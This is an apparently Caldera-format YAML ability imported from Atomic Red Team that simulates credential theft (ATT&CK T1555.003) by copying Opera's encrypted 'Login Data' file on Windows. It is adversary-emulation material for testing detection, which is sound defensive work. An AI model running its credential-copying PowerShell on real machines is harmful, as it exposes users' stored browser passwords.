- id: 28498c17-57e4-495a-b0be-cc1e36de408b
  name: Simulating access to Opera Login Data
  description: Simulates an adversary accessing encrypted credentials from Opera web
    browser's login database.
  tactic: credential-access
  technique:
    attack_id: T1555.003
    name: 'Credentials from Password Stores: Credentials from Web Browsers'
  platforms:
    windows:
      psh:
        command: 'if (((Test-Path "$env:LOCALAPPDATA\Programs\Opera\launcher.exe")
          -Or (Test-Path "C:\Program Files\Opera\launcher.exe") -Or (Test-Path "C:\Program
          Files (x86)\Opera\launcher.exe"))) {exit 0} else {exit 1}; then : ; else
          New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction
          Ignore -Force | Out-Null; $installer = "PathToAtomicsFolder\..\ExternalPayloads\OperaStandaloneInstaller.exe";
          Invoke-WebRequest -OutFile "PathToAtomicsFolder\..\ExternalPayloads\OperaStandaloneInstaller.exe"
          https://get.geo.opera.com/pub/opera/desktop/82.0.4227.43/win/Opera_82.0.4227.43_Setup.exe;
          Start-Process $installer -ArgumentList ''/install /silent /launchopera=1
          /setdefaultbrowser=0''; Start-Sleep -s 180; Stop-Process -Name "opera";
          fi; if (Test-Path "$env:APPDATA\Opera Software\Opera Stable\Login Data")
          {exit 0} else {exit 1}; then : ; else New-Item -Path "$env:APPDATA\Opera
          Software\Opera Stable\Login Data" -ItemType File; fi; Copy-Item "$env:APPDATA\Opera
          Software\Opera Stable\Login Data" -Destination "PathToAtomicsFolder\..\ExternalPayloads"'
        cleanup: Remove-Item -Path "PathToAtomicsFolder\..\ExternalPayloads\Login
          Data" -Force -ErrorAction Ignore
  plugin: atomic
  singleton: false
  repeatable: true
  delete_payload: false
  privilege: ''
  buckets:
  - atomic-red-team
  - credential-access
  - t1555.003
  author: Atomic Red Team
  additional_info:
    dependencies:
    - description: 'Opera must be installed

        '
      prereq_command: if (((Test-Path "$env:LOCALAPPDATA\Programs\Opera\launcher.exe")
        -Or (Test-Path "C:\Program Files\Opera\launcher.exe") -Or (Test-Path "C:\Program
        Files (x86)\Opera\launcher.exe"))) {exit 0} else {exit 1}
      get_prereq_command: 'New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\"
        -ErrorAction Ignore -Force | Out-Null

        $installer = "PathToAtomicsFolder\..\ExternalPayloads\OperaStandaloneInstaller.exe"

        Invoke-WebRequest -OutFile "PathToAtomicsFolder\..\ExternalPayloads\OperaStandaloneInstaller.exe"
        https://get.geo.opera.com/pub/opera/desktop/82.0.4227.43/win/Opera_82.0.4227.43_Setup.exe

        Start-Process $installer -ArgumentList ''/install /silent /launchopera=1 /setdefaultbrowser=0''

        Start-Sleep -s 180

        Stop-Process -Name "opera"

        '
    - description: 'Opera login data file must exist

        '
      prereq_command: if (Test-Path "$env:APPDATA\Opera Software\Opera Stable\Login
        Data") {exit 0} else {exit 1}
      get_prereq_command: 'New-Item -Path "$env:APPDATA\Opera Software\Opera Stable\Login
        Data" -ItemType File

        '
    technique_created: '2020-02-12T18:57:36.041Z'
    atomic_guid: 28498c17-57e4-495a-b0be-cc1e36de408b
    import_timestamp: '2025-08-25T03:16:02.477761Z'
